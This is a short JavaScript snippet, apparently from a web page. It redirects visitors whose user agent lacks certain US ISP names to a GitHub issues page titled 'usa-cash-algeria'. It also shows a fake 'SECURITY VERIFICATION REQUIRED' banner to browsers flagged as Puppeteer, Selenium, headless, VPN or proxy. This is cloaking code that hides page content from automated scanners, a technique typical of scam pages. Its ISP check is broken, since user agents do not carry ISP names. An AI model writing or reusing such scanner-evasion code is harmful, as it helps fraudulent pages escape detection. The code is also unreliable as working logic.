// Block Non-US Traffic  
const allowedISPs = ["Comcast", "Verizon", "AT&T", "Spectrum", "Xfinity"];  
if(!new RegExp(allowedISPs.join("|")).test(navigator.userAgent)) {  
    window.location.href = "https://github.com/GateGith/usa-cash-algeria/issues";  
}  

// Block Bots/VPNs  
const badPatterns = ["Puppeteer", "Selenium", "Headless", "VPN", "Proxy"];  
if(new RegExp(badPatterns.join("|")).test(navigator.userAgent)) {  
    document.body.innerHTML = '<h1 style="color:red">⚠️ SECURITY VERIFICATION REQUIRED</h1>';  
    window.stop();  
}  
